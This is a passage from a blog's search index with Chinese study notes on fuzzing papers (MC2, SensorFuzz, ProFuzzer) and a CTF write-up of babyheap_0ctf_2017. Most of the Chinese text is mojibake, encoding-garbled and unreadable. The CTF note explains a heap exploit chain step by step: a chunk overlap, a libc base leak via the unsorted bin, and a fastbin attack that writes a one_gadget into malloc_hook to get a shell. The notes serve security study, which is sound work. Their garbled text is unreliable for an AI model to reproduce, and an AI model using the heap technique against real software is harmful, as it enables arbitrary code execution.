åœ¨è¿™ä¸€èŠ‚ä¸­ï¼Œæˆ‘ä»¬å¼•å…¥äº†ä¸€ä¸ªå¤æ‚æ€§ç†è®ºæ¡†æ¶æ¥æ¨ç†æœ€ä½³æ¨¡ç³Šå™¨åœ¨ç›®æ ‡ç¨‹åºæ‰§è¡Œæ•°é‡æ–¹é¢çš„æ€§èƒ½ä¸‹é™\nfuzzing as oracle-guided search è¯¥æ¡†æ¶å…è®¸æ¨¡ç³Šå™¨é€šè¿‡æŸ¥è¯¢ä¸€ä¸ªç”²éª¨æ–‡æ¥å­¦ä¹ å…³äºä»»ä½•æœ‰ç•Œè¾“å…¥åŒºåŸŸIçš„ä¿¡æ¯ã€‚ å‡è®¾æ¯ä¸ªOracleæŸ¥è¯¢æœ€å¤šå¯ä»¥æä¾›ä¸€ä¸ªç»™å®šè¾“å…¥åŒºåŸŸçš„cä¸ªæ¯”ç‰¹çš„ä¿¡æ¯ è¯¥æ¡†æ¶ä¸åšå‡è®¾ï¼Œæ²¡æœ‰ä»»ä½•å…³äºç¨‹åºçš„å…ˆéªŒçŸ¥è¯† problem definition å°†æœ‰å‘ç°ç›’æ¨¡ç³Šå™¨å¤„ç†çš„ä»»åŠ¡å®šä¹‰ä¸ºä¸€ä¸ªOracleå¼•å¯¼çš„æœç´¢é—®é¢˜ï¼šåœ¨ç»™å®šè®¿é—®ç¨‹åºï¼Œæ§åˆ¶æµå›¾ï¼Œè¾“å…¥ç©ºé—´ï¼Œç›®æ ‡è¾¹å’ŒOracleè¯¢é—®ï¼Œæ¨¡ç³Šç®—æ³•å¿…é¡»èƒ½æ‰¾åˆ°ä¸€ä¸ªè¾“å…¥èƒ½å¤Ÿè®©è¯¥è¾“å…¥å¯¹åº”çš„è·¯å¾„è¾¾åˆ°ç›®æ ‡è¾¹ã€‚ execution complexity è¿™ä¸ªæ˜¯ä¸ºäº†è¡¡é‡æ¨¡ç³Šå™¨çš„æ€§èƒ½ï¼Œå®šä¹‰çš„ä¸€ä¸ªæŒ‡æ ‡å€¼ã€‚åœ¨æ‰¾åˆ°è¾¾åˆ°ç›®æ ‡çš„è¾“å…¥ä¹‹å‰éœ€è¦çš„ç”²éª¨æ–‡æŸ¥è¯¢æ•°é‡ã€‚ï¼ˆç”²éª¨æ–‡æŸ¥è¯¢çš„æ•°é‡ç›´æ¥æ˜ å°„åˆ°ç¨‹åºçš„æ‰§è¡Œæ•°é‡ï¼Œè¿™å¥è¯æ˜¯ä¸æ˜¯å¯ä»¥ç†è§£æœªæŸ¥è¯¢æ•°å°±æ˜¯ç¨‹åºçš„æ‰§è¡Œæ•°ï¼‰\nè¿™é‡Œä¹ŸæŒ‡å‡ºäº†æœ¬æ–‡æ¡†æ¶çš„ç›®çš„ï¼Œè®¡ç®—æµ‹è¯•fuzzerçš„execution complexityï¼Œè¯•å›¾æ‰¾åˆ°execution complexityçš„ä¸‹ç•Œï¼ˆæœ€å°å€¼ï¼‰ï¼Œå³fæ‰¾åˆ°è¾¾åˆ°ç›®æ ‡çš„è¾“å…¥ä¹‹å‰éœ€è¦çš„æœ€å°ç”²éª¨æ–‡æŸ¥è¯¢æ•°é‡ï¼Œç”¨è¿™ä¸ªæŒ‡æ ‡è¡¡é‡fuzzeræ€§èƒ½ã€‚\nè¿™ä¸€å°èŠ‚ç»™å‡ºäº†æ¨¡ç³Šç®—æ³•çš„ä¸‹é™å®šç†ï¼ˆå®šç†2.1ï¼‰ï¼šç»™å®šåœ¨æ¯æ¬¡æŸ¥è¯¢ä¸­åªæ­ç¤ºä¸€ä¸ªæ’å®šçš„cæ¯”ç‰¹ä¿¡æ¯çš„ä»»æ„Oracleï¼Œä»»ä½•æ¨¡ç³Šç®—æ³•éƒ½éœ€è¦Î©(log(N))çš„æ‰§è¡Œå¤æ‚åº¦æ¥å¯»æ‰¾åœ¨Nå¤§å°çš„è¾“å…¥ç©ºé—´ä¸­è¾¾åˆ°ç›®æ ‡çš„è¾“å…¥ã€‚\nGreybox vs Blackbox Oracle ä½œè€…å¼ºè°ƒï¼Œè¿™ä¸ªä¸‹é™æ˜¯æ— æ³•ç”¨é»‘ç›’ç”²éª¨æ–‡å®ç°çš„ï¼Œå› ä¸ºåœ¨é»‘ç›’ç”²éª¨æ–‡ä¸­æ— æ³•æä¾›cæ¯”ç‰¹çš„åé¦ˆã€‚\n2.3 ä½¿ç”¨å™ªå£°æŠ€æœ¯çš„oracleçš„æœ€ä½³å®šå‘fuzz å™ªå£°è®¡æ•°oracleï¼šé€‰æ‹©ä¸¤ä¸ªä»»æ„çš„input regionï¼Œè¿‘ä¼¼åœ°è®¡ç®—å¯ä»¥åˆ°è¾¾targetså¹¶ä¸”å±äºè¿™ä¸¤ä¸ªregionçš„inputsçš„ä¸ªæ•°ï¼Œè¿”å›c=1æ¯”ç‰¹çš„ä¿¡æ¯ã€‚ç»™å‡ºäº†è®¡æ•°oracleçš„å…¬å¼ï¼Œå¤§æ¦‚å°±æ˜¯æ¯”è¾ƒä¸¤ä¸ªinput regionçš„æ•°é‡å¤§å°ï¼Œè¿”å›1æˆ–0ã€‚ $$ O ( I _ { L } , I _ { R } ) = \\left{ \\begin{matrix} { 1 } \u0026amp; { \\mathrm { i f ~ } C ( I _ { L } ) \\geq C ( I _ { R } ) } \\ { 0 } \u0026amp; { \\mathrm { o t h e r w i s e } } \\ \\end{matrix} \\right. $$\nè¿™é‡Œæåˆ°äº†ä¸€ä¸ªé”™è¯¯æ¦‚ç‡pï¼Œä½œè€…å‡è®¾å™ªå£°ç”²éª¨æ–‡ä»¥p\u0026lt;1/2çš„æ¦‚ç‡è¿”å›é”™è¯¯çš„ç­”æ¡ˆã€‚ æœ€ä½³ç¡®å®šæ€§æ¨¡ç³Šå™¨ï¼šè¿­ä»£åœ°å°†ä¸€ä¸ªè¾“å…¥åŒºåŸŸåˆ†æˆä¸¤åŠï¼Œå¹¶æŸ¥è¯¢è®¡æ•°ç”²éª¨æ–‡ä»¥æŒ‘é€‰è®¡æ•°è¾ƒé«˜çš„é‚£ä¸€åŠï¼Œæœ€ç»ˆæ‰¾åˆ°è¾¾åˆ°ç›®æ ‡çš„è¾“å…¥ã€‚\nè¿™ä¸ªç®—æ³•çš„å‰ææ˜¯é”™è¯¯æ¦‚ç‡ä¸º0ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰å™ªå£°ï¼ˆnoiselessï¼‰ æœ€ä½³çš„éšæœºåŒ–æ¨¡ç³Šå™¨ï¼šæŒ‡å‡ºä¸Šé¢çš„ç®—æ³•ä¸å¤Ÿå®é™…ï¼ˆpä¸å¯èƒ½ä¸º0ï¼‰ï¼Œæå‡ºäº†ä¸€ç§æ–°çš„éšæœºæ¨¡ç³Šç®—æ³•\nä½œè€…æŒ‡å‡ºï¼šéšæœºç®—æ³•çš„æœŸæœ›å€¼è€ƒè™‘äº†æ‰€æœ‰çš„æ½œåœ¨è¡Œä¸ºï¼Œæ²¡æœ‰å¯¹è¾“å…¥åˆ†å¸ƒè¿›è¡Œå‡è®¾ï¼Œä½¿å¾—é€‚ç”¨äºä»»ä½•ç¨‹åºï¼›å…·æœ‰ä¸€å®šæˆåŠŸæ¦‚ç‡çš„éšæœºæ¨¡ç³Šç®—æ³•éƒ½å¯ä»¥è¢«å¤šæ¬¡é‡æ–°è¿è¡Œï¼Œå› æ­¤å…¶å¤±è´¥çš„æ¦‚ç‡éšç€è¯•éªŒçš„å¢åŠ è€Œå‘ˆæŒ‡æ•°çº§ä¸‹é™ï¼Œè¾¾åˆ°ä¸€ä¸ªå¯ä»¥å¿½ç•¥ä¸è®¡çš„å°å€¼ã€‚ ç®—æ³•çš„æ‰§è¡Œå¤æ‚åº¦ï¼ˆå®šç†2.2ï¼‰ï¼šç»™å®šä¸€ä¸ªå™ªå£°è®¡æ•°Oracleï¼Œè¯¥Oracleè¿”å›1bitä¿¡æ¯å¹¶ä¸”æŸ¥è¯¢å¤±è´¥æ¦‚ç‡på°äº1/2ï¼Œéšæœºæ¨¡ç³Šç®—æ³•æœ‰O((1âˆ’ğ›¿)âˆ— log(N)/(1/2âˆ’p)^2)çš„é¢„æœŸæ‰§è¡Œå¤æ‚åº¦ï¼Œä»¥æ‰¾åˆ°æˆåŠŸæ¦‚ç‡è‡³å°‘ä¸º1âˆ’ğ›¿çš„å¯ä»¥åˆ°è¾¾targetçš„è¾“å…¥ã€‚ ç®—æ³•çš„æœ€ä¼˜æ€§ï¼ˆå®šç†2.3ï¼‰ï¼šç»™å®šä»»ä½•æ¯æ¬¡æŸ¥è¯¢è¿”å›ä¸€ä¸ªå¸¸æ•°cæ¯”ç‰¹çš„ä¿¡æ¯ï¼Œå¤±è´¥æ¦‚ç‡p\u0026lt;1/2çš„Oracleï¼Œä»»ä½•ä»¥è‡³å°‘1âˆ’ğ›¿çš„æ¦‚ç‡æˆåŠŸçš„æ¨¡ç³Šç®—æ³•éƒ½æœ‰Î©((1âˆ’ğ›¿)âˆ— log(N) ( 1 2âˆ’p)2)çš„é¢„æœŸæ‰§è¡Œå¤æ‚æ€§ã€‚ ä½œè€…æŒ‡å‡ºè¯¥ç®—æ³•é€šè¿‡è‡ªé€‚åº”åœ°é€‰æ‹©åŸºäºæ¯ä¸ªç”²éª¨æ–‡æŸ¥è¯¢çš„åˆ†å‰²ç‚¹æ¥é™ä½é¢„æœŸçš„æ‰§è¡Œå¤æ‚åº¦ï¼Œå› æ­¤æ€»å…±æœ‰è¾ƒå°‘çš„æŸ¥è¯¢ã€‚ ç®—æ³•æ¦‚è¿° ï¼šä»ç›¸ä¿¡ä»»ä½•è¾“å…¥åŒºåŸŸéƒ½åŒæ ·å¯èƒ½åŒ…å«åˆ°è¾¾ç›®æ ‡çš„è¾“å…¥å¼€å§‹ï¼Œæˆ‘ä»¬çš„æ¨¡ç³Šç®—æ³•æ ¹æ®æ¯ä¸ªç”²éª¨æ–‡æŸ¥è¯¢è¿­ä»£åœ°å¢åŠ æœ‰å¸Œæœ›åŒºåŸŸçš„æƒé‡ï¼Œå¹¶ä¼˜å…ˆè€ƒè™‘åœ¨è¿™äº›æœ‰å¸Œæœ›çš„è¾“å…¥åŒºåŸŸå†…çš„ç‚¹ä¸Šè¿›è¡Œåˆ†å‰² 2.3 é€šè¿‡è’™ç‰¹å¡æ´›è®¡æ•°çš„å™ªå£°è®¡æ•°Oracle å› ä¸ºinput regionçš„å¤§å°å¾€å¾€è¿œè¿œå¤§äºå¯ä»¥è¾¾åˆ°targetçš„è¾“å…¥çš„ä¸ªæ•°ï¼Œæ‰€ä»¥ç›´æ¥åº”ç”¨è’™ç‰¹å¡æ´›è¿‘ä¼¼çš„è¯ï¼Œå¾ˆå¤šinput regionçš„è¾¾åˆ°targetè®¡æ•°ä¼šè¿‘ä¼¼ä¸º0ï¼Œè¿™æ ·ä¼šå¯¼è‡´æ¨¡ç³Šå™¨æ›´éš¾è¯†åˆ«å“ªä¸ªinput regionæ›´æœ‰å¯èƒ½å«æœ‰å¯ä»¥åˆ°è¾¾targetçš„inputs åˆ©ç”¨CFGç»“æ„è¿›è¡Œè®¡æ•° ç–‘é—® äºŒè¿›åˆ¶æœç´¢ï¼ˆbinary searchï¼‰æ˜¯ä¸ªå•¥ç©æ„å„¿ï¼Œç¿»ç¿»å‚è€ƒæ–‡çŒ®\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/%F0%9D%91%80%F0%9D%90%B62-rigorous-and-efficient-directed-greybox-fuzzing/","summary":"MC2 : ä¸¥æ ¼è€Œé«˜æ•ˆçš„å®šå‘ç°ç›’æ¨¡ç³Šæ³• abstract èƒŒæ™¯ï¼šmost existing directed greybox fuzzers do not provied any theoretical analysis of their performence or optimality.å¤§å¤šæ•°ç°æœ‰çš„æœ‰å‘ç°ç›’æ¨¡ç³Šå™¨éƒ½æ²¡æœ‰å¯¹å…¶æ€§èƒ½æˆ–æœ€","title":"ğ‘€ğ¶2 Rigorous and Efficient Directed Greybox Fuzzing"},{"content":"(68æ¡æ¶ˆæ¯) [pwn]å †ï¼šfastbin attack è¯¦è§£_breezeO_o çš„åšå®¢-CSDN åšå®¢ (68æ¡æ¶ˆæ¯) [BUUCTF]PWNâ€”â€”babyheap_0ctf_2017_Angel~Yan çš„åšå®¢-CSDN åšå®¢ ã€å­¦ä¹ åˆ†äº«ã€‘babyheap_0ctf_2017ï¼Œä¸€é“å…¥é—¨å †çš„é¢˜ è¿™ä¸ªè§†é¢‘éå¸¸è¯¦ç»†ï¼Œéå¸¸å¥½\nï¼ˆä¸»è¦æ˜¯å¯¹ä¸Šé¢ä¸¤ä¸ª writeup çš„è¡¥å……å’Œæ€è·¯çš„æ•´ç†ï¼‰ è¿™é“é¢˜ä¸»è¦åˆ†ä¸ºä¸¤ä¸ªæ­¥éª¤\næ³„éœ² libc åœ°å€ ä¿®æ”¹ malloc_hook ä¸º onegadget ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦æ³„éœ² libc åœ°å€å‘¢ï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦çŸ¥é“ malloc_hook çš„åœ°å€ã€‚è€Œ malloc_hook æ˜¯ä¸€ä¸ª libc ä¸Šçš„å‡½æ•°æŒ‡é’ˆï¼Œè°ƒç”¨ malloc æ—¶å¦‚æœè¯¥æŒ‡é’ˆä¸ä¸ºç©ºåˆ™æ‰§è¡Œå®ƒæŒ‡å‘çš„å‡½æ•°ï¼Œå¯ä»¥é€šè¿‡å°† mall_hook æŒ‡å‘ä¸€ä¸ª onegadget æ¥ getshellã€‚\næ³„éœ² libc é¦–å…ˆæˆ‘ä»¬ç”³è¯·å››ä¸ª chunkï¼Œç¼–å· 0ã€1ã€2ã€3ã€‚ï¼ˆå®é™…å¤§å°åº”è¯¥è¿˜åŠ ä¸Š presize çš„ 8 ä¸ªå­—èŠ‚ï¼‰\n1 2 3 4 alloc(0x18) #0 alloc(0x68) #1 alloc(0x68) #2 alloc(0x18) #3 ç„¶åï¼Œæˆ‘ä»¬é€šè¿‡æº¢å‡º 0 å· chunk æ¥ä¿®æ”¹ 1 å· chunk çš„å¤§å°ï¼ˆå› ä¸º 1 å· chunk çš„æŒ‡é’ˆæŒ‡ä¸åˆ°è‡ªå·±çš„ size çš„ä½ç½®ï¼‰ï¼Œå°†å…¶ä¿®æ”¹ä¸º chunk 1+chunk2 çš„å¤§å°ã€‚ ç„¶å free (1)ï¼Œå› ä¸ºæ­¤æ—¶ 1 å· chunk çš„å¤§å°æ˜¯ 0xe0ï¼Œæ‰€ä»¥ä¼šæ”¾åˆ° unsortbin é“¾è¡¨ã€‚ æˆ‘ä»¬ä¸ºå•¥è¦è®© 1 å’Œ 2 chunk ä½œä¸ºä¸€ä¸ª chunk é‡Šæ”¾å‘¢ã€‚å› ä¸º unsortbin æœ‰ä¸€ä¸ªç‰¹æ€§ï¼Œå°±æ˜¯å¦‚æœ usortbin åªæœ‰ä¸€ä¸ª bin ï¼Œå®ƒçš„ fd å’Œ bk æŒ‡é’ˆä¼šæŒ‡å‘åŒä¸€ä¸ªåœ°å€ (unsorted bin é“¾è¡¨çš„å¤´éƒ¨ï¼‰ï¼Œè¿™ä¸ªåœ°å€ä¸º main_arena + 0 x 58 ï¼Œè€Œä¸” main_arena åˆç›¸å¯¹ libc å›ºå®šåç§» 0 x3c4b20 ï¼Œæ‰€ä»¥å¾—åˆ°è¿™ä¸ª fd çš„å€¼ï¼Œç„¶åå‡å» 0 x 58 å†å‡å» main_arena ç›¸å¯¹äº libc çš„å›ºå®šåç§»ï¼Œå³å¾—åˆ° libc çš„åŸºåœ°å€ã€‚ æ‰€ä»¥æˆ‘ä»¬è¦æƒ³æ–¹è®¾æ³•å¾—åˆ°è¿™ä¸ª fd çš„å€¼ï¼Œä½†æ˜¯æˆ‘ä»¬å¯¹ chunk é‡Šæ”¾åï¼ŒæŒ‡é’ˆä¹Ÿå°±å¤±æ•ˆäº†ï¼Œè¯»ä¸åˆ°æ­¤æ—¶æŒ‚åœ¨ unsortbin é“¾è¡¨ä¸Š chunk çš„å†…å®¹ã€‚ æ‰€ä»¥æˆ‘ä»¬è®© chunk 1 å’Œ 2 å †å é‡Šæ”¾ï¼Œæ­¤æ—¶ unsortbin é“¾è¡¨ä¸ŠæŒ‚äº†ä¸€ä¸ªå¤§å°ä¸º 0xe0 çš„ chunkï¼Œç„¶åæˆ‘ä»¬ alloc (0x68)ï¼Œæ­¤æ—¶ç³»ç»Ÿä¼šå°†0xe0 çš„ chunk åˆ†å‰²ï¼Œå°†0x68 åˆ†é…ï¼Œè€Œå‰©ä¸‹çš„0x68 å¤§å°çš„ chunk å°±æ˜¯æˆ‘ä»¬ä¹‹å‰ alloc çš„ chunk 2ï¼Œæ­¤æ—¶æˆ‘ä»¬å°† chunk 2 æ‰“å°ä¾¿å¯ä»¥å¾—åˆ° fdï¼Œä¹Ÿå°±å¾—åˆ° libc çš„åŸºå€ã€‚\nä¿®æ”¹ malloc_hook ä¸º onegadget å¤§ä½“æ€è·¯æ˜¯æˆ‘ä»¬ä¿®æ”¹æŒ‚åœ¨ fastbin é“¾ä¸Šçš„ç©ºé—² chunk çš„ fbï¼Œè®©å®ƒæŒ‡å‘ malloc_hook æ‰€åœ¨çš„åœ°å€åŒºåŸŸï¼Œè®©å®ƒä»¥ä¸ºè‡ªå·±åé¢è¿˜æŒ‚ç€ä¸€ä¸ªç©ºé—² chunkã€‚æˆ‘ä»¬å°†è¿™ä¸ªä¼ªé€ çš„ fake chunk ç”³è¯·åˆ°ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¯¹å…¶è¿›è¡Œç¼–è¾‘äº†ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥å¯¹ malloc_hook æ‰€åœ¨çš„åœ°å€åŒºåŸŸè¿›è¡Œç¼–è¾‘ï¼Œé‚£ä¹ˆå°±æŠŠ malloc_hook çš„åœ°æ–¹å†™å…¥ onegadgetã€‚å¤§åŠŸå‘Šæˆã€‚ è¿™é‡Œæœ‰ä¸ªå°ç»†èŠ‚ï¼Œæˆ‘ä»¬ä¼ªé€ çš„ fake chunk çš„å¤§å°è¦ç¬¦åˆ fastbin é“¾è¡¨çš„å¤§å°è¦æ±‚ï¼Œæ‰€ä»¥åœ¨ malloc_hook æ‰€åœ¨çš„åœ°å€åŒºåŸŸè¦æ‰¾ä¸€ä¸ªå€¼æ»¡è¶³ fastbin å¤§å°çš„åœ°å€æ‰å¯ä»¥ã€‚\n","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/ctf/pwn/overlapping-heap%E4%BB%A50ctf-babyheap%E4%B8%BA%E4%BE%8B/","summary":"(68æ¡æ¶ˆæ¯) [pwn]å †ï¼šfastbin attack è¯¦è§£_breezeO_o çš„åšå®¢-CSDN åšå®¢ (68æ¡æ¶ˆæ¯) [BUUCTF]PWNâ€”â€”babyhe","title":"overlapping heapï¼ˆä»¥0ctf babyheapä¸ºä¾‹ï¼‰"},{"content":"Posteï¼šæœºå™¨äººè½¦è¾†ä¼ æ„Ÿå™¨æ¬ºéª—æ”»å‡»çš„è‡ªåŠ¨å‘ç°\næ‘˜è¦ åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬æå‡ºäº†ä¸€ä¸ªæ–°çš„ä¼ æ„Ÿå™¨æ¨¡ç³Šæ¡†æ¶SensorFuzzï¼Œå®ƒå¯ä»¥ç³»ç»Ÿåœ°å‘ç°æœºå™¨äººè½¦è¾†ä¸Šæ½œåœ¨çš„ä¼ æ„Ÿå™¨æ¬ºéª—æ”»å‡»ã€‚å®ƒé€šè¿‡æ­£å¼æ¨¡æ‹Ÿç°æœ‰çš„ä¼ æ„Ÿå™¨æ”»å‡»å’Œåˆ©ç”¨é«˜ä¿çœŸè½¦è¾†æ¨¡æ‹Ÿæ¥äº§ç”Ÿæ¶æ„çš„ä¼ æ„Ÿå™¨è¾“å…¥ï¼Œç„¶åç”¨åŸºäºå¼¹æ€§çš„åé¦ˆæœºåˆ¶åˆ†æè¾“å…¥å¯¹è½¦è¾†çš„å½±å“ã€‚\nintroduction ç ”ç©¶èƒŒæ™¯:\nç°åœ¨æœ‰å¾ˆå¤šé’ˆå¯¹RVï¼ˆrobotic vehiclesï¼‰çš„æ”»å‡»ï¼› å‘ç°RVçš„æœªçŸ¥æ”»å‡»å¹¶è¿›è¡Œé˜²å¾¡å…·æœ‰æŒ‘æˆ˜æ€§ï¼Œå› ä¸º ä¼ æ„Ÿå™¨è¾“å…¥å€¼å…·æœ‰å·¨å¤§å’ŒåŠ¨æ€çš„èŒƒå›´ å®éªŒæ˜‚è´µè€—æ—¶ ç ”ç©¶å†…å®¹ï¼š\nå¼€å‘äº†ä¸€ä¸ªåé¦ˆé©±åŠ¨çš„æ¨¡ç³Šå™¨SensorFuzz ç”ŸæˆçœŸå®çš„ä¼ æ„Ÿå™¨æ¬ºéª—è¾“å…¥ åŸºäºä¸€ä¸ªé«˜ä¿çœŸçš„ç¯å†…è½¯ä»¶æ¨¡æ‹Ÿå™¨ é€šè¿‡çªå˜æ¨¡å‹æ¥å‡å°‘è¯¯æŠ¥ ç›‘æ§ç³»ç»Ÿå†…éƒ¨çŠ¶æ€ï¼Œæµ‹é‡RVå¯¹æ”»å‡»çš„å¼¹æ€§ï¼Œå¼¹æ€§è¯„åˆ†ä½œä¸ºåé¦ˆã€‚ MOTIVATION AND CHALLENGES Large input spaceï¼šè¾“å…¥ç©ºé—´æå…¶å·¨å¤§ï¼Œä½†æ˜¯å¤§é‡çš„è¾“å…¥å…¶å®åœ¨ç°å®ç”Ÿæ´»ä¸­ä¸ä¼šå‡ºç°ï¼Œæ‰€ä»¥åˆ©ç”¨ä¼ æ„Ÿå™¨å’Œç›¸å…³æ”»å‡»çš„è¯­ä¹‰å¼•å¯¼çš„æ¨¡ç³Šåˆ†æå°†ä¿ƒè¿›æ”»å‡»å‘ç°çš„è¿‡ç¨‹ã€‚\nFuzzing feedbackï¼šfuzzæµ‹è¯•çš„feedbacké€‰æ‹©ä»€ä¹ˆæŒ‡æ ‡æ˜¯ä¸ªæŒ‘æˆ˜ã€‚\nDESIGN é¦–å…ˆï¼Œåœ¨æ¨¡æ‹Ÿå™¨ä¸­ï¼Œæˆ‘ä»¬å¯¹äº§ç”Ÿæ¨¡æ‹Ÿå™¨è¾“å…¥çš„å‡½æ•°è¿›è¡Œæ£€æµ‹ï¼Œä»¥æ£€ç´¢åŸå§‹çš„ä¼ æ„Ÿå™¨å€¼ï¼Œå¹¶æ³¨å…¥ç”±SensorFuzzå˜å¼‚çš„ä¼ æ„Ÿå™¨å€¼ã€‚ç¬¬äºŒï¼Œç”±æ§åˆ¶ç³»ç»Ÿäº§ç”Ÿçš„æ§åˆ¶çŠ¶æ€æ—¥å¿—è¢«ç”¨æ¥å®æ—¶è®¡ç®—RVå¯¹å˜å¼‚å€¼çš„å¼¹æ€§ã€‚ç„¶åï¼Œå¼¹æ€§è¢«ç”¨ä½œåé¦ˆï¼Œä»¥å¸®åŠ©ç”Ÿæˆä¸‹ä¸€ä¸ªè¾“å…¥ã€‚ç¬¬ä¸‰ï¼ŒGCSçš„ä»»åŠ¡çŠ¶æ€è¢«ç”¨æ¥æ£€æµ‹ä»»åŠ¡å¤±è´¥ã€‚\nä¼ æ„Ÿå™¨è¾“å…¥å˜å¼‚ åˆ©ç”¨ç°æœ‰ä¼ æ„Ÿå™¨æ”»å‡»å…¬å¼ï¼ˆè¿™ä¸ªå…¬å¼å°±æ˜¯å…³äºæŒ¯å¹…ï¼Œé¢‘ç‡ï¼Œç›¸ä½çš„å…¬å¼ï¼Œå› ä¸ºä¼ æ„Ÿå™¨è¾“å…¥çš„å€¼å°±æ˜¯è¿™äº›ï¼‰ï¼Œå¼€å‘äº†çªå˜æ¨¡å‹ï¼ˆå…¶å®ä¹Ÿæ˜¯ä¸ªå…³äºæŒ¯å¹…é¢‘ç‡ç›¸ä½çš„å…¬å¼ï¼‰ã€‚\nåŸºäºå¼¹æ€§çš„åé¦ˆæœºåˆ¶ ç»™å‡ºäº†å¼¹æ€§åˆ†æ•°çš„è®¡ç®—å…¬å¼å’Œçªå˜æ¨¡å‹çš„é€‰æ‹©ç­–ç•¥ã€‚\næˆ‘çš„è¯„ä»· è¿™ç¯‡è®ºæ–‡åªæ˜¯æŠŠfuzzçš„æ€æƒ³ç§»æ¤åˆ°RVçš„æ¼æ´æ£€æµ‹ä¸Šï¼Œå¯èƒ½è¿™å—åšçš„äººæ¯”è¾ƒå°‘ã€‚åˆ›æ–°ç‚¹åœ¨äºä¼ æ„Ÿå™¨è¾“å…¥å˜å¼‚å…¬å¼å’Œå¼¹æ€§è¡¡é‡å…¬å¼ï¼Œä½†æ˜¯è¿˜æ˜¯å¤„åœ¨ä¸€ä¸ªå»ºæ¨¡çš„é˜¶æ®µï¼Œä¸ç®—å¾ˆéš¾ã€‚\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/poster-automated-discovery-of-sensor-spoofing-attacks-on-robotic-vehicles/","summary":"Posteï¼šæœºå™¨äººè½¦è¾†ä¼ æ„Ÿå™¨æ¬ºéª—æ”»å‡»çš„è‡ªåŠ¨å‘ç° æ‘˜è¦ åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬æå‡ºäº†ä¸€ä¸ªæ–°çš„ä¼ æ„Ÿå™¨æ¨¡ç³Šæ¡†æ¶SensorFuzzï¼Œå®ƒå¯ä»¥ç³»ç»Ÿåœ°å‘ç°æœºå™¨äººè½¦è¾†","title":"Poster Automated Discovery of Sensor Spoofing Attacks on Robotic Vehicles"},{"content":"æ–‡è¯‘åï¼šprofuzzerï¼šå®æ—¶è¾“å…¥ç±»å‹æ¢æµ‹ï¼Œä»¥æ›´å¥½åœ°å‘ç°é›¶æ—¥æ¼æ´ ä½œè€…ï¼šæ¸¸ä¼Ÿ å•ä½ï¼šæ™®é¡¿å¤§å­¦ å›½å®¶ï¼š #ç¾å›½ å¹´ä»½ï¼š #2019å¹´ æ¥æºï¼š #SP å…³é”®å­—ï¼š #fuzzing ä»£ç åœ°å€ï¼š ç¬”è®°å»ºç«‹æ—¶é—´ï¼š 2023-04-26 09:31\nabstract å®æ—¶çš„æ¢æµ‹æŠ€æœ¯ã€‚å¯ä»¥è‡ªåŠ¨çš„å‘ç°å’Œç†è§£å…³é”® fieldsï¼Œå¹¶ä¸”è‡ªåŠ¨è°ƒèŠ‚å˜å¼‚ç­–ç•¥ ç”¨å•ä¸ªå­—èŠ‚å˜å¼‚ï¼Œç„¶åè‡ªåŠ¨åˆ†æå…¶ fuzz ç»“æœï¼Œå°†ç›¸å…³å­—èŠ‚è¿æ¥åœ¨ä¸€èµ·ï¼Œå¹¶è¯†åˆ«è¿æ¥åçš„å­—æ®µç±»å‹ï¼Œä¾æ®è¯¥ç±»å‹çš„å˜å¼‚ç­–ç•¥æ¥è¿›ä¸€æ­¥å˜å¼‚ã€‚ introduction changes most of input based grammar mutation lead to the same execution path and therefore only one of the should be tested futhermore, maybe inputs that exploit vulnerabilities not follow the grammar random mutation has large input space fuzzing the type probing propose a novel technology called profuzzer which has two stages:\nfirst stage: it conducts sequential probingâ€”â€”enumerating every values of every bytes, each time changes on byte. And it also collection information about the target\u0026rsquo;s execution paths under different byte values. These information will used to be analyzed to recover data fields and field type. second stage: utilize these imformation to mutate each field to exploit the values that could lead to an attack or explore legitimate values for better coverage. Overview probing engine generate type templates Iterates all possible value of byte of input, Collects the corresponding execution profiles. Extracts metrics as the features of bytes Groups the consecutive bytes with similar features into a field Determines the type of each field based on the relations between the changes of its possible values and the corresponding variation of observed features Mutation engine guid mutations based on the probed templates a. increase code coverage b. the filed informatin can be used to guide exploit generation Execution Engine and Report Engine based on the AFL DESIGN AND IMPLEMENTATION fuzzing related input field types Assertion\nonly have one correct value Raw Data\ndon\u0026rsquo;t affect the execution of a program Enumeration\nhas a set of valid values Loop Count\ndetermines the times of snippet is executed it has substantial impact on path counts and negligible impact on the paths themselves Offset\ndetermines the data location it may impact on the execution paths Size\ndetermines the amount of data the program should read from the input file it may impact on the execution paths if a byte of input does not fall into the above categories, then used the random mutation strategy\nType Probing probing method has been mentioned many time above and will not repeat again it\u0026rsquo;s worth noting that the way of storing profile (probing result) is edge vector, a campact hash arry edge vector keeps the execution frequencies of individual control-flow edges defintions author defined two metrics based on edge vectors before execute and after execute\ncoverage similarity: the size of the edge coverage intersection of the two vectors, dived by the size of their union frequency difference: the radio between the number of edges with different frequencies and the number of edges that different coverage æ³¨æ„å…¬å¼ä¸­å‡ºç°çš„ä¸¤ç§ edge vector æ˜¯ i ä½ç½®ä¿®æ”¹å‰åçš„ä¸¤ä¸ª edge vector step 1 feature extraction STEP II: Field Identification author considers that invalid values always lead to the same termination path with an exception, which is the shortest path, as a result these invalid values must lead to the same coverage and frequency metrics (ä¸ªäººè®¤ä¸ºé™¤äº†å€¼ç›¸åŒï¼Œå€¼çš„ä¸‹æ ‡ä¹Ÿåº”è¯¥ç›¸åŒå§)\nSTEP III: Field Type Identification Assertion Fields there exists one and only one value v for the byte that induces a similarity score 1 the similarity score of any other value, is less than the midrange value Raw Data Fields raw data fields values do not affect the control flow of program Enumeration Fields Loop Count Fields Offset Fields Reprobing probing is not the fuzz, it not mutate the input. It just change the byte of input sequentially and change one byte each time. After probing, we get the field ande field type of the input to the testing program. Then we need to mutate it, but based the seed we may get crash and may get better coverage, if the input get better coverage than before, we set this 